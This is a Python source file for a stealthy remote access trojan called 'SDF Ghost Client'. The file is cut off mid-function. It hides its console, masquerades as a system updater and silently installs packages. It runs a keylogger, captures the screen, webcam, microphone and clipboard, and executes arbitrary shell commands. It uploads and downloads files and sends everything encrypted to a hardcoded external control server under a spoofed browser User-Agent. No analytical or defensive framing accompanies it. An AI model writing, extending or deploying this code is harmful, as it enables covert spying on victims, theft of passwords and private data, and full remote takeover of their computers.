#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SDF Ghost Client — PC agent (Windows / Linux / macOS)
Communicates with the SDF Control Panel via AES-GCM encrypted HTTP.
"""

import os
import sys
import json
import base64
import time
import socket
import subprocess
import platform
import tempfile
import random
import string
import threading
import io
from pathlib import Path
from datetime import datetime
from urllib import request as url_request, error as url_error

# ==============================================================================
# STEALTH CONFIGURATION
# ==============================================================================

HIDE_CONSOLE = True
TASK_NAME    = "sysupdater"
CONFIG_PATH  = Path.home() / '.cache' / 'sysupdate' / 'config.json'
CACHE_DIR    = Path.home() / '.cache' / 'sysupdate'
MUTEX_NAME   = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))

BASE_URL = 'https://securitydienetforces.pythonanywhere.com'
AES_KEY  = base64.b64decode('AdqYcTHmoqWNYLMpwp9DD7ApmHKXF0VoPlt+DKyNGEY=')

# ==============================================================================
# SUPPRESS ALL OUTPUT
# ==============================================================================

class NullWriter:
    def write(self, *a, **k): pass
    def flush(self, *a, **k): pass
    def close(self, *a, **k): pass

if HIDE_CONSOLE:
    sys.stdout = NullWriter()
    sys.stderr = NullWriter()
    os.environ['PYTHONWARNINGS'] = 'ignore'

# ==============================================================================
# AUTO-INSTALL DEPENDENCIES
# ==============================================================================

def _silent_install(pkg):
    for exe in (sys.executable, 'pip'):
        try:
            subprocess.run(
                [exe, '-m', 'pip', 'install', '--quiet', pkg]
                if exe == sys.executable
                else ['pip', 'install', '--quiet', pkg],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
            return True
        except Exception:
            pass
    return False

def _ensure_deps():
    for mod, pkg in [
        ('psutil',      'psutil'),
        ('cryptography','cryptography'),
        ('PIL',         'Pillow'),
        ('mss',         'mss'),
        ('pynput',      'pynput'),
        ('pyperclip',   'pyperclip'),
        ('cv2',         'opencv-python-headless'),
    ]:
        try:
            __import__(mod)
        except ImportError:
            _silent_install(pkg)

_ensure_deps()

# ==============================================================================
# OPTIONAL IMPORTS
# ==============================================================================

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False

try:
    from PIL import ImageGrab, Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    import mss
    HAS_MSS = True
except ImportError:
    HAS_MSS = False

try:
    from pynput import keyboard as _pynput_kb
    HAS_PYNPUT = True
except ImportError:
    HAS_PYNPUT = False

try:
    from pynput import mouse as _pynput_mouse
    HAS_PYNPUT_MOUSE = True
except ImportError:
    HAS_PYNPUT_MOUSE = False

try:
    import pyperclip
    HAS_PYPERCLIP = True
except ImportError:
    HAS_PYPERCLIP = False

try:
    import cv2
    HAS_CV2 = True
except ImportError:
    HAS_CV2 = False

try:
    import pyaudio
    HAS_PYAUDIO = True
except ImportError:
    HAS_PYAUDIO = False

# ==============================================================================
# SINGLE INSTANCE
# ==============================================================================

class SingleInstance:
    def __init__(self):
        self.lock_file = Path(tempfile.gettempdir()) / f'.{MUTEX_NAME}.lock'
        self.held = False

    def acquire(self):
        try:
            if self.lock_file.exists():
                try:
                    old_pid = int(self.lock_file.read_text().strip())
                    if platform.system() == 'Windows':
                        r = subprocess.run(
                            ['tasklist', '/FI', f'PID eq {old_pid}'],
                            capture_output=True, text=True)
                        if str(old_pid) in r.stdout:
                            return False
                    else:
                        os.kill(old_pid, 0)
                        return False
                except Exception:
                    pass
                self.lock_file.unlink(missing_ok=True)
            self.lock_file.write_text(str(os.getpid()))
            self.held = True
            return True
        except Exception:
            return False

    def release(self):
        if self.held:
            try:
                self.lock_file.unlink(missing_ok=True)
            except Exception:
                pass

# ==============================================================================
# CRYPTOGRAPHY
# ==============================================================================

class Crypto:
    @staticmethod
    def encrypt(data: dict) -> str:
        try:
            if not HAS_CRYPTO:
                return base64.b64encode(json.dumps(data).encode()).decode()
            iv = os.urandom(12)
            ct = AESGCM(AES_KEY).encrypt(iv, json.dumps(data).encode(), None)
            return base64.b64encode(iv + ct).decode()
        except Exception:
            return base64.b64encode(json.dumps(data).encode()).decode()

    @staticmethod
    def decrypt(token: str):
        try:
            if not HAS_CRYPTO:
                return json.loads(base64.b64decode(token))
            raw = base64.b64decode(token)
            if len(raw) < 12:
                return None
            plain = AESGCM(AES_KEY).decrypt(raw[:12], raw[12:], None)
            return json.loads(plain)
        except Exception:
            try:
                return json.loads(base64.b64decode(token))
            except Exception:
                return None

# ==============================================================================
# SYSTEM INFO
# ==============================================================================

class SystemInfo:
    @staticmethod
    def hostname():
        try:
            return socket.gethostname()
        except Exception:
            return 'localhost'

    @staticmethod
    def machine_id():
        try:
            if platform.system() == 'Windows':
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                   r"SOFTWARE\Microsoft\Cryptography")
                return winreg.QueryValueEx(k, "MachineGuid")[0]
            for p in ('/etc/machine-id', '/var/lib/dbus/machine-id'):
                try:
                    return Path(p).read_text().strip()
                except Exception:
                    pass
            if platform.system() == 'Darwin':
                return subprocess.check_output(
                    ['ioreg', '-rd1', '-c', 'IOPlatformExpertDevice']
                ).decode().split('IOPlatformUUID')[1].split('"')[1].strip()
        except Exception:
            pass
        return SystemInfo.hostname()

    @staticmethod
    def ip():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return '127.0.0.1'

    @staticmethod
    def mac():
        try:
            import uuid
            n = uuid.getnode()
            return ':'.join([f'{(n >> e) & 0xff:02x}' for e in range(0, 48, 8)][::-1])
        except Exception:
            return '00:00:00:00:00:00'

    @staticmethod
    def os_info():
        try:
            s = platform.system()
            if s == 'Windows':
                import winreg
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                                   r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
                return winreg.QueryValueEx(k, "ProductName")[0]
            if s == 'Linux':
                for line in Path('/etc/os-release').read_text().splitlines():
                    if line.startswith('PRETTY_NAME='):
                        return line.split('=', 1)[1].strip().strip('"')
            if s == 'Darwin':
                return (subprocess.check_output(['sw_vers', '-productName']).decode().strip()
                        + ' ' +
                        subprocess.check_output(['sw_vers', '-productVersion']).decode().strip())
            return f"{s} {platform.release()}"
        except Exception:
            return platform.system() or 'Unknown'

    @staticmethod
    def geoip(ip=None):
        try:
            if not ip:
                ip = SystemInfo.ip()
            if ip in ('127.0.0.1', 'localhost', ''):
                return None
            url = (f"http://ip-api.com/json/{ip}"
                   f"?fields=status,country,countryCode,city,lat,lon,isp,org")
            req = url_request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
            with url_request.urlopen(req, timeout=5) as r:
                d = json.loads(r.read())
                if d.get('status') == 'success':
                    return {k: d.get(k) for k in ('lat','lon','city','country','isp')}
        except Exception:
            pass
        return None

    @staticmethod
    def cpu():
        if not HAS_PSUTIL:
            return {'percent': 0, 'cores': 0}
        try:
            return {'percent': psutil.cpu_percent(interval=0.2),
                    'cores':   psutil.cpu_count()}
        except Exception:
            return {'percent': 0, 'cores': 0}

    @staticmethod
    def memory():
        if not HAS_PSUTIL:
            return {'total': 0, 'percent': 0, 'free': 0}
        try:
            m = psutil.virtual_memory()
            return {'total': m.total, 'percent': m.percent, 'free': m.available}
        except Exception:
            return {'total': 0, 'percent': 0, 'free': 0}

    @staticmethod
    def disk():
        if not HAS_PSUTIL:
            return {'total': 0, 'free': 0, 'percent': 0}
        try:
            d = psutil.disk_usage('/')
            return {'total': d.total, 'free': d.free, 'percent': d.percent}
        except Exception:
            return {'total': 0, 'free': 0, 'percent': 0}

    @staticmethod
    def all_info():
        ip  = SystemInfo.ip()
        geo = SystemInfo.geoip(ip)
        cpu = SystemInfo.cpu()
        mem = SystemInfo.memory()
        dsk = SystemInfo.disk()
        out = {
            'hostname':     SystemInfo.hostname(),
            'machine_id':   SystemInfo.machine_id(),
            'mac':          SystemInfo.mac(),
            'ip':           ip,
            'os_type':      SystemInfo.os_info(),
            'cpu_percent':  cpu['percent'],
            'ram_percent':  mem['percent'],
            'disk_percent': dsk['percent'],
            'disk_total':   dsk['total'],
            'disk_free':    dsk['free'],
        }
        if geo:
            out.update({k: geo.get(k) for k in ('lat','lon','city','country','isp')})
        return out

# ==============================================================================
# FILE OPERATIONS
# ==============================================================================

class FileOps:
    @staticmethod
    def list_dir(path):
        try:
            items = []
            for item in sorted(Path(path).iterdir())[:200]:
                try:
                    st = item.stat()
                    items.append({
                        'name':     item.name,
                        'path':     str(item),
                        'is_dir':   item.is_dir(),
                        'size':     st.st_size if not item.is_dir() else 0,
                        'modified': datetime.fromtimestamp(st.st_mtime).isoformat(),
                    })
                except Exception:
                    continue
            return items
        except Exception:
            return []

    @staticmethod
    def read_b64(path):
        try:
            return base64.b64encode(Path(path).read_bytes()).decode()
        except Exception:
            return None

    @staticmethod
    def write_b64(path, data_b64):
        try:
            p = Path(path)
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_bytes(base64.b64decode(data_b64))
            return True
        except Exception:
            return False

# ==============================================================================
# SCREEN CAPTURE
# ==============================================================================

class ScreenCapture:
    @staticmethod
    def capture(quality=55):
        buf = io.BytesIO()

        # Method 1: Pillow ImageGrab
        if HAS_PIL:
            try:
                img = ImageGrab.grab()
                img.save(buf, format='JPEG', quality=quality)
                return base64.b64encode(buf.getvalue()).decode()
            except Exception:
                pass

        # Method 2: mss (needs Pillow for conversion, guard carefully)
        if HAS_MSS:
            try:
                with mss.mss() as sct:
                    mon   = sct.monitors[1]
                    frame = sct.grab(mon)
                    buf2  = io.BytesIO()
                    if HAS_PIL:
                        # Convert mss frame to PIL and compress
                        pil_img = Image.frombytes('RGB', (frame.width, frame.height), frame.rgb)
                        pil_img.save(buf2, format='JPEG', quality=quality)
                    else:
                        # mss has its own PNG saver — use it, send as PNG b64 (larger but works)
                        mss.tools.to_png(frame.rgb, frame.size, output=buf2)
                    return base64.b64encode(buf2.getvalue()).decode()
            except Exception:
                pass

        # Method 3: scrot on Linux
        if platform.system() == 'Linux':
            try:
                tmp = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
                tmp.close()
                r = subprocess.run(['scrot', '-q', str(quality), tmp.name],
                                   capture_output=True)
                if r.returncode == 0:
                    data = base64.b64encode(Path(tmp.name).read_bytes()).decode()
                    os.unlink(tmp.name)
                    return data
            except Exception:
                pass

        return None

# ==============================================================================
# WEBCAM CAPTURE
# ==============================================================================

class WebcamCapture:
    @staticmethod
    def capture(camera_index=0, quality=55):
        """Capture a single frame from the webcam."""
        # Method 1: OpenCV
        if HAS_CV2:
            try:
                cap = cv2.VideoCapture(camera_index)
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                time.sleep(0.3)
                ret, frame = cap.read()
                cap.release()
                if ret and frame is not None:
                    ret2, buf = cv2.imencode('.jpg', frame,
                                             [cv2.IMWRITE_JPEG_QUALITY, quality])
                    if ret2:
                        return base64.b64encode(buf.tobytes()).decode()
            except Exception:
                pass

        # Method 2: macOS imagesnap
        if platform.system() == 'Darwin':
            try:
                tmp = tempfile.NamedTemporaryFile(suffix='.jpg', delete=False)
                tmp.close()
                r = subprocess.run(['imagesnap', '-q', tmp.name],
                                   capture_output=True, timeout=10)
                if r.returncode == 0 and os.path.exists(tmp.name):
                    data = base64.b64encode(Path(tmp.name).read_bytes()).decode()
                    os.unlink(tmp.name)
                    return data
            except Exception:
                pass

        return None

# ==============================================================================
# MOUSE CONTROL
# ==============================================================================

class MouseControl:
    @staticmethod
    def execute(cmd_str: str) -> str:
        """
        Supported formats:
          mouse:click              — left click at current position
          mouse:right_click        — right click
          mouse:double_click       — double left click
          mouse:scroll_up          — scroll wheel up 3 ticks
          mouse:scroll_down        — scroll wheel down 3 ticks
          mouse:move:<dx>:<dy>     — relative move by dx,dy pixels
          mouse:moveto:<x>:<y>     — absolute move to x,y
          mouse:drag:<x1>:<y1>:<x2>:<y2> — drag from (x1,y1) to (x2,y2)
        """
        if not HAS_PYNPUT_MOUSE:
            return MouseControl._fallback(cmd_str)

        try:
            mc     = _pynput_mouse.Controller()
            parts  = cmd_str.split(':')
            action = parts[1] if len(parts) > 1 else ''

            if action == 'click':
                mc.click(_pynput_mouse.Button.left)
            elif action == 'right_click':
                mc.click(_pynput_mouse.Button.right)
            elif action == 'double_click':
                mc.click(_pynput_mouse.Button.left, 2)
            elif action == 'scroll_up':
                mc.scroll(0, 3)
            elif action == 'scroll_down':
                mc.scroll(0, -3)
            elif action == 'move' and len(parts) >= 4:
                mc.move(int(parts[2]), int(parts[3]))
            elif action == 'moveto' and len(parts) >= 4:
                mc.position = (int(parts[2]), int(parts[3]))
            elif action == 'drag' and len(parts) >= 6:
                x1, y1 = int(parts[2]), int(parts[3])
                x2, y2 = int(parts[4]), int(parts[5])
                mc.position = (x1, y1)
                mc.press(_pynput_mouse.Button.left)
                time.sleep(0.05)
                mc.position = (x2, y2)
                time.sleep(0.05)
                mc.release(_pynput_mouse.Button.left)
            else:
                return f'unknown mouse action: {action}'
            return 'ok'
        except Exception as e:
            return f'mouse error: {e}'

    @staticmethod
    def _fallback(cmd_str: str) -> str:
        parts  = cmd_str.split(':')
        action = parts[1] if len(parts) > 1 else ''
        if platform.system() == 'Linux':
            try:
                if action == 'click':
                    subprocess.run(['xdotool', 'click', '1'], check=False, timeout=5)
                elif action == 'right_click':
                    subprocess.run(['xdotool', 'click', '3'], check=False, timeout=5)
                elif action == 'double_click':
                    subprocess.run(['xdotool', 'click', '--repeat', '2', '1'],
                                   check=False, timeout=5)
                elif action == 'move' and len(parts) >= 4:
                    subprocess.run(['xdotool', 'mousemove_relative', '--',
                                    parts[2], parts[3]], check=False, timeout=5)
                elif action == 'moveto' and len(parts) >= 4:
                    subprocess.run(['xdotool', 'mousemove',
                                    parts[2], parts[3]], check=False, timeout=5)
                elif action == 'scroll_up':
                    subprocess.run(['xdotool', 'click', '4'], check=False, timeout=5)
                elif action == 'scroll_down':
                    subprocess.run(['xdotool', 'click', '5'], check=False, timeout=5)
                return 'ok (xdotool)'
            except Exception as e:
                return f'xdotool error: {e}'
        return 'mouse control not available'

# ==============================================================================
# KEYLOGGER
# ==============================================================================

_keylog_buf  = []
_keylog_lock = threading.Lock()
_kl_listener = None

_kl_current_word = []
_kl_current_app  = 'Unknown'
_kl_app_ts       = 0   # throttle get_active_app calls

def _get_active_app():
    try:
        if platform.system() == 'Windows':
            import ctypes
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            buf  = ctypes.create_unicode_buffer(512)
            ctypes.windll.user32.GetWindowTextW(hwnd, buf, 512)
            return buf.value or 'Windows'
        if platform.system() == 'Darwin':
            return subprocess.check_output(
                ['osascript', '-e',
                 'tell application "System Events" to name of first application '
                 'process whose frontmost is true'],
                timeout=1).decode().strip()
        if platform.system() == 'Linux':
            return subprocess.check_output(
                ['xdotool', 'getactivewindow', 'getwindowname'],
                timeout=1, stderr=subprocess.DEVNULL).decode().strip()
    except Exception:
        pass
    return 'Unknown'

def _on_key_press(key):
    global _kl_current_word, _kl_current_app, _kl_app_ts
    try:
        # Only refresh active app every 2 seconds to avoid slowdown
        now = time.monotonic()
        if now - _kl_app_ts > 2.0:
            _kl_current_app = _get_active_app()
            _kl_app_ts      = now

        char = getattr(key, 'char', None)
        if char and char.isprintable():
            _kl_current_word.append(char)
        else:
            name = getattr(key, 'name', str(key)).replace('Key.', '')
            if name in ('space', 'enter', 'tab'):
                if _kl_current_word:
                    word = ''.join(_kl_current_word)
                    with _keylog_lock:
                        _keylog_buf.append({
                            'text': word + (' ' if name == 'space' else '\n'),
                            'app':  _kl_current_app,
                        })
                        if len(_keylog_buf) > 2000:
                            _keylog_buf.pop(0)
                _kl_current_word = []
            elif name == 'backspace':
                if _kl_current_word:
                    _kl_current_word.pop()
    except Exception:
        pass

def start_keylogger():
    global _kl_listener
    if not HAS_PYNPUT or _kl_listener:
        return
    try:
        _kl_listener = _pynput_kb.Listener(on_press=_on_key_press, daemon=True)
        _kl_listener.start()
    except Exception:
        pass

def flush_keylog():
    with _keylog_lock:
        out = list(_keylog_buf)
        _keylog_buf.clear()
    return out

# ==============================================================================
# PROCESS LIST
# ==============================================================================

class ProcessInfo:
    @staticmethod
    def get():
        if not HAS_PSUTIL:
            return []
        out = []
        try:
            for p in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
                try:
                    out.append({
                        'pid':  p.info['pid'],
                        'name': p.info['name'],
                        'cpu':  round(p.info['cpu_percent'] or 0, 2),
                        'mem':  round(p.info['memory_percent'] or 0, 2),
                    })
                except Exception:
                    continue
        except Exception:
            pass
        return out

# ==============================================================================
# NETWORK CONNECTIONS
# ==============================================================================

class NetInfo:
    @staticmethod
    def get():
        if not HAS_PSUTIL:
            return []
        out = []
        try:
            for c in psutil.net_connections(kind='all'):
                laddr = f"{c.laddr.ip}:{c.laddr.port}" if c.laddr else ''
                raddr = f"{c.raddr.ip}:{c.raddr.port}" if c.raddr else ''
                out.append({
                    'laddr':  laddr,
                    'raddr':  raddr,
                    'status': c.status or '',
                    'pid':    c.pid or 0,
                })
        except Exception:
            pass
        return out

# ==============================================================================
# CLIPBOARD MONITOR
# ==============================================================================

_last_clip = ''

class ClipboardMonitor:
    @staticmethod
    def get():
        global _last_clip
        text = ''
        if HAS_PYPERCLIP:
            try:
                text = pyperclip.paste() or ''
            except Exception:
                pass
        elif platform.system() == 'Darwin':
            try:
                text = subprocess.check_output(
                    ['pbpaste'], timeout=2).decode('utf-8', errors='ignore')
            except Exception:
                pass
        elif platform.system() == 'Linux':
            for tool in (['xclip', '-o', '-selection', 'clipboard'],
                         ['xsel', '--clipboard', '--output']):
                try:
                    text = subprocess.check_output(
                        tool, timeout=2, stderr=subprocess.DEVNULL
                    ).decode('utf-8', errors='ignore')
                    break
                except Exception:
                    pass
        elif platform.system() == 'Windows':
            try:
                import ctypes
                ctypes.windll.user32.OpenClipboard(0)
                h    = ctypes.windll.user32.GetClipboardData(1)
                text = ctypes.cast(h, ctypes.c_char_p).value.decode('utf-8', errors='ignore')
                ctypes.windll.user32.CloseClipboard()
            except Exception:
                pass
        if text and text != _last_clip:
            _last_clip = text
            return text[:10000]
        return None

# ==============================================================================
# SCREEN STREAMER
# ==============================================================================

_stream_active = False
_stream_thread = None

def _stream_worker(hostname):
    global _stream_active
    while _stream_active:
        try:
            frame = ScreenCapture.capture(quality=40)
            if frame:
                payload = {'frame': frame}
                enc = Crypto.encrypt(payload)
                req = url_request.Request(
                    f"{BASE_URL}/api/device/{hostname}/live_frame",
                    data=enc.encode('utf-8'),
                    headers={'Content-Type': 'application/octet-stream'})
                url_request.urlopen(req, timeout=10)
        except Exception:
            pass
        time.sleep(2.5)

def start_screen_stream(hostname):
    global _stream_active, _stream_thread
    if _stream_active:
        return
    _stream_active = True
    _stream_thread = threading.Thread(
        target=_stream_worker, args=(hostname,), daemon=True)
    _stream_thread.start()

def stop_screen_stream():
    global _stream_active
    _stream_active = False

# ==============================================================================
# MIC STREAMER
# ==============================================================================

_mic_active = False
_mic_thread = None

SAMPLE_RATE   = 16000
CHUNK_SECONDS = 4
CHUNK_FRAMES  = SAMPLE_RATE * CHUNK_SECONDS  # 64000 frames per chunk

def _mic_worker(hostname):
    """Records 4-second WAV chunks and POSTs them to /api/device/<hostname>/mic."""
    global _mic_active

    # --- Try pyaudio first ---
    if HAS_PYAUDIO:
        try:
            import pyaudio, wave
            pa     = pyaudio.PyAudio()
            stream = pa.open(format=pyaudio.paInt16, channels=1, rate=SAMPLE_RATE,
                             input=True, frames_per_buffer=1024)
            while _mic_active:
                try:
                    frames = []
                    for _ in range(0, int(SAMPLE_RATE / 1024 * CHUNK_SECONDS)):
                        if not _mic_active:
                            break
                        frames.append(stream.read(1024, exception_on_overflow=False))
                    if not frames:
                        continue
                    buf = io.BytesIO()
                    with wave.open(buf, 'wb') as wf:
                        wf.setnchannels(1)
                        wf.setsampwidth(pa.get_sample_size(pyaudio.paInt16))
                        wf.setframerate(SAMPLE_RATE)
                        wf.writeframes(b''.join(frames))
                    wav_b64 = base64.b64encode(buf.getvalue()).decode()
                    _mic_send(hostname, wav_b64, CHUNK_SECONDS)
                except Exception:
                    time.sleep(1)
            stream.stop_stream()
            stream.close()
            pa.terminate()
            return
        except Exception:
            pass

    # --- Fallback: sox on Linux/macOS ---
    while _mic_active:
        try:
            tmp = tempfile.NamedTemporaryFile(suffix='.wav', delete=False)
            tmp.close()
            sox_cmd = ['sox', '-d', '-r', str(SAMPLE_RATE), '-c', '1',
                       '-b', '16', tmp.name, 'trim', '0', str(CHUNK_SECONDS)]
            r = subprocess.run(sox_cmd, capture_output=True,
                               timeout=CHUNK_SECONDS + 5)
            if r.returncode == 0 and os.path.exists(tmp.name):
                wav_b64 = base64.b64encode(Path(tmp.name).read_bytes()).decode()
                _mic_send(hostname, wav_b64, CHUNK_SECONDS)
            try:
                os.unlink(tmp.name)
            except Exception:
                pass
        except Exception:
            time.sleep(2)

def _mic_send(hostname, wav_b64, duration):
    try:
        payload = {
            'hostname': hostname,
            'data':     wav_b64,
            'duration': duration,
        }
        enc = Crypto.encrypt(payload)
        req = url_request.Request(
            f"{BASE_URL}/api/device/{hostname}/mic",
            data=enc.encode('utf-8'),
            headers={'Content-Type': 'application/octet-stream'})
        url_request.urlopen(req, timeout=15)
    except Exception:
        pass

def start_mic_stream(hostname):
    global _mic_active, _mic_thread
    if _mic_active:
        return
    _mic_active = True
    _mic_thread = threading.Thread(
        target=_mic_worker, args=(hostname,), daemon=True)
    _mic_thread.start()

def stop_mic_stream():
    global _mic_active
    _mic_active = False

# ==============================================================================
# COMMAND EXECUTOR
# ==============================================================================

class CommandExecutor:
    @staticmethod
    def execute(cmd):
        try:
            cmd_lower = cmd.strip().lower()

            # ── Screenshot / snapshot ─────────────────────────────────────────
            if cmd_lower in ('screenshot', 'snapshot'):
                img = ScreenCapture.capture()
                key = 'screen_b64' if cmd_lower == 'screenshot' else 'snapshot_b64'
                return {'type': cmd_lower, 'data': img,
                        'data_key': key,
                        'output': 'captured' if img else 'failed'}

            # ── Webcam / camera ────────────────────────────────────────────────
            if cmd_lower in ('webcam', 'camera', 'cam', 'webcam:0', 'webcam:1'):
                idx = 1 if cmd_lower.endswith(':1') else 0
                img = WebcamCapture.capture(camera_index=idx)
                # store as snapshot_b64 so panel's existing handler picks it up
                return {'type': 'webcam',
                        'data': img,
                        'data_key': 'snapshot_b64',
                        'output': 'webcam captured' if img else 'webcam failed (no camera?)'}

            # ── Mouse control ─────────────────────────────────────────────────
            if cmd_lower.startswith('mouse:'):
                result = MouseControl.execute(cmd.strip())
                return {'type': 'cmd_result', 'output': result}

            # ── Change directory ──────────────────────────────────────────────
            if cmd_lower.startswith('cd '):
                try:
                    path = cmd[3:].strip() or str(Path.home())
                    if path == '~':
                        path = str(Path.home())
                    os.chdir(path)
                    return {'type': 'cmd_result', 'output': os.getcwd()}
                except Exception as e:
                    return {'type': 'cmd_result', 'output': f'cd failed: {e}'}

            if cmd_lower == 'pwd':
                return {'type': 'cmd_result', 'output': os.getcwd()}

            # ── List directory ─────────────────────────────────────────────────
            if cmd_lower in ('ls', 'dir'):
                items = FileOps.list_dir(os.getcwd())
                lines = [f"{'D' if i['is_dir'] else 'F'}  {i['name']}" for i in items[:50]]
                return {'type': 'cmd_result',
                        'output': f"{len(items)} items in {os.getcwd()}\n" + '\n'.join(lines),
                        'file_list': items,
                        'file_list_path': os.getcwd()}

            # ── Browse (explicit path) ────────────────────────────────────────
            if cmd_lower.startswith('browse:'):
                path  = cmd[7:].strip() or str(Path.home())
                items = FileOps.list_dir(path)
                lines = [f"{'D' if i['is_dir'] else 'F'}  {i['name']}" for i in items[:50]]
                return {'type': 'cmd_result',
                        'output': f"{len(items)} items in {path}\n" + '\n'.join(lines),
                        'file_list': items,
                        'file_list_path': path}

            # ── Read file ─────────────────────────────────────────────────────
            if cmd_lower.startswith('cat '):
                try:
                    return {'type': 'cmd_result',
                            'output': Path(cmd[4:].strip()).read_text(errors='ignore')[:10000]}
                except Exception as e:
                    return {'type': 'cmd_result', 'output': f'cat failed: {e}'}

            # ── Whoami ────────────────────────────────────────────────────────
            if cmd_lower == 'whoami':
                try:
                    return {'type': 'cmd_result', 'output': os.getlogin()}
                except Exception:
                    return {'type': 'cmd_result',
                            'output': subprocess.check_output(['whoami'], text=True).strip()}

            # ── Sysinfo ───────────────────────────────────────────────────────
            if cmd_lower == 'sysinfo':
                return {'type': 'cmd_result',
                        'output': json.dumps(SystemInfo.all_info(), indent=2)[:10000]}

            # ── Process list ──────────────────────────────────────────────────
            if cmd_lower in ('ps', 'processes'):
                procs = ProcessInfo.get()
                lines = sorted(procs, key=lambda p: p['cpu'], reverse=True)[:30]
                out   = '\n'.join(
                    f"PID {p['pid']:6}  CPU {p['cpu']:5.1f}%  "
                    f"MEM {p['mem']:5.1f}%  {p['name']}" for p in lines)
                return {'type': 'cmd_result', 'output': out or 'no processes'}

            # ── Kill process ──────────────────────────────────────────────────
            if cmd_lower.startswith('kill '):
                try:
                    pid = int(cmd[5:].strip())
                    os.kill(pid, 9)
                    return {'type': 'cmd_result', 'output': f'killed PID {pid}'}
                except Exception as e:
                    return {'type': 'cmd_result', 'output': f'kill failed: {e}'}

            # ── Download file ─────────────────────────────────────────────────
            if cmd_lower.startswith('download '):
                path = cmd[9:].strip()
                data = FileOps.read_b64(path)
                if data:
                    return {'type': 'file_download',
                            'data_b64': data,
                            'path': path,
                            'output': f'downloaded {path}'}
                return {'type': 'cmd_result', 'output': f'file not found: {path}'}

            # ── Generic shell execution ───────────────────────────────────────
            if platform.system() == 'Windows':
                si = subprocess.STARTUPINFO()
                si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
                res = subprocess.run(cmd, shell=True, capture_output=True,
                                     text=True, timeout=30, startupinfo=si)
            else:
                res = subprocess.run(cmd, shell=True, capture_output=True,
                                     text=True, timeout=30,
                                     executable='/bin/bash')

            out = res.stdout or ''
            if res.stderr:
                out += ('\n' if out else '') + res.stderr
            return {'type': 'cmd_result',
                    'output': (out.strip() or 'OK')[:50000]}

        except subprocess.TimeoutExpired:
            return {'type': 'cmd_result', 'output': 'command timed out after 30s'}
        except Exception as e:
            return {'type': 'cmd_result', 'output': f'error: {e}'}

# ==============================================================================
# GHOST CLIENT
# ==============================================================================

class GhostClient:
    def __init__(self):
        self._hostname   = SystemInfo.hostname()
        self._machine_id = SystemInfo.machine_id()
        self._running    = False
        self._interval   = 30
        CACHE_DIR.mkdir(parents=True, exist_ok=True)
        self._load_config()

    # ── Config ───────────────────────────────────────────────────────────────

    def _load_config(self):
        try:
            if CONFIG_PATH.exists():
                cfg = json.loads(CONFIG_PATH.read_text())
                self._interval = cfg.get('interval', 30)
                self._hostname = cfg.get('hostname', self._hostname)
        except Exception:
            pass

    def _save_config(self):
        try:
            CONFIG_PATH.write_text(json.dumps({
                'interval':   self._interval,
                'hostname':   self._hostname,
                'machine_id': self._machine_id,
                'updated':    datetime.now().isoformat(),
            }))
        except Exception:
            pass

    # ── Payload builder ──────────────────────────────────────────────────────

    def _collect_payload(self):
        info = SystemInfo.all_info()
        cur  = os.getcwd()
        payload = {
            'hostname':       self._hostname,
            'machine_id':     self._machine_id,
            'mac':            info.get('mac', ''),
            'ip':             info.get('ip', ''),
            'os_type':        info.get('os_type', ''),
            'cpu_percent':    info.get('cpu_percent', 0),
            'ram_percent':    info.get('ram_percent', 0),
            'disk_percent':   info.get('disk_percent', 0),
            'disk_total':     info.get('disk_total', 0),
            'disk_free':      info.get('disk_free', 0),
            'file_list_path': cur,
            'file_list':      FileOps.list_dir(cur)[:100],
            'timestamp':      datetime.now().isoformat(),
        }
        for k in ('lat', 'lon', 'city', 'country', 'isp'):
            if k in info:
                payload[k] = info[k]

        kl = flush_keylog()
        if kl:
            payload['keylog'] = kl

        payload['process_list']    = ProcessInfo.get()
        payload['net_connections'] = NetInfo.get()

        clip = ClipboardMonitor.get()
        if clip:
            payload['clipboard'] = clip

        return payload

    # ── HTTP helpers ─────────────────────────────────────────────────────────

    def _send_payload(self, payload):
        try:
            enc = Crypto.encrypt(payload)
            req = url_request.Request(
                f"{BASE_URL}/api/ping",
                data=enc.encode('utf-8'),
                headers={
                    'Content-Type': 'application/octet-stream',
                    'User-Agent':   ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                     'AppleWebKit/537.36'),
                })
            with url_request.urlopen(req, timeout=30) as resp:
                if resp.status == 200:
                    raw = json.loads(resp.read().decode('utf-8'))
                    return Crypto.decrypt(raw['enc']) if 'enc' in raw else raw
        except Exception:
            pass
        return None

    def _report_cmd(self, cmd, output, extra=None):
        """Send a cmd_result back to the panel."""
        try:
            rpt = {
                'hostname':   self._hostname,
                'cmd_result': {'cmd': cmd, 'output': output},
            }
            if extra:
                rpt.update(extra)
            self._send_payload(rpt)
        except Exception:
            pass

    # ── Response processor ───────────────────────────────────────────────────

    def _process_response(self, response):
        try:
            if response.get('status') == 'die':
                self._running = False
                return

            # File push from panel → write to disk
            upload = response.get('upload')
            if upload and isinstance(upload, dict):
                dest = upload.get('dest_path')
                data = upload.get('data_b64')
                if dest and data:
                    FileOps.write_b64(dest, data)

            for cmd in response.get('cmds', []):
                cmd_str = str(cmd).strip()

                # ── Stream controls ─────────────────────────────────────────
                if cmd_str == 'start_stream':
                    start_screen_stream(self._hostname)
                    self._report_cmd(cmd_str, 'screen stream started')
                    continue
                if cmd_str == 'stop_stream':
                    stop_screen_stream()
